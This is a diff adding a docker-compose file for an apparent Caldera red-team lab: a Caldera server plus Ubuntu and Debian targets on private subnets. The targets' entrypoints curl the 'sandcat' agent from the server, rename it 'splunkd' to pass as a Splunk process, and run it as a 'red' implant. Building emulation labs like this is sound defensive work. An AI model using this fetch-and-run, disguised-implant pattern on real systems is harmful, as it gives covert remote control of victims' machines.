@@ -1,0 +1,78 @@
+version: '3'
+
+services:
+  caldera:
+    build:
+      context: caldera
+      dockerfile: Dockerfile
+      args:
+        TZ: "UTC" #TZ sets timezone for ubuntu setup
+        WIN_BUILD: "true" #WIN_BUILD is used to enable windows build in sandcat plugin
+        
+    image: caldera:latest
+    ports:
+      - "8888:8888"
+      - "8443:8443"
+      - "7010:7010"
+      - "7011:7011/udp"
+      - "7012:7012"
+      - "8853:8853"
+      - "8022:8022"
+      - "2222:2222"
+    networks:
+      ubuntu-net:
+        ipv4_address: 172.20.0.2
+        
+      debian-net:
+        ipv4_address: 172.30.0.2
+        
+    volumes:
+      - caldera-volume:/app
+      
+  ubuntu:
+    build: ./ubuntu
+    depends_on:
+      - caldera
+      
+    networks:
+      ubuntu-net:
+        ipv4_address: 172.20.0.3
+        
+    volumes:
+      - ubuntu-volume:/ubuntu_volume
+      
+    working_dir: /ubuntu_volume
+    entrypoint: /bin/bash -c 'sleep 5 && curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "http://172.20.0.2:8888/file/download" > splunkd; chmod +x splunkd; ./splunkd -server "http://172.20.0.2:8888" -group red -v && sleep infinity'
+  
+  debian:
+    build: ./debian
+    depends_on:
+      - caldera
+      
+    networks:
+      debian-net:
+        ipv4_address: 172.30.0.3
+        
+    volumes:
+      - debian-volume:/debian_volume
+      
+    working_dir: /debian_volume
+    entrypoint: /bin/bash -c 'sleep 5 && curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "http://172.30.0.2:8888/file/download" > splunkd; chmod +x splunkd; ./splunkd -server "http://172.30.0.2:8888" -group red -v && sleep infinity'
+
+networks:
+  ubuntu-net:
+    ipam:
+      driver: default
+      config:
+        - subnet: 172.20.0.0/24
+
+  debian-net:
+    ipam:
+      driver: default
+      config:
+        - subnet: 172.30.0.0/24
+        
+volumes:
+  caldera-volume:
+  ubuntu-volume:
+  debian-volume:
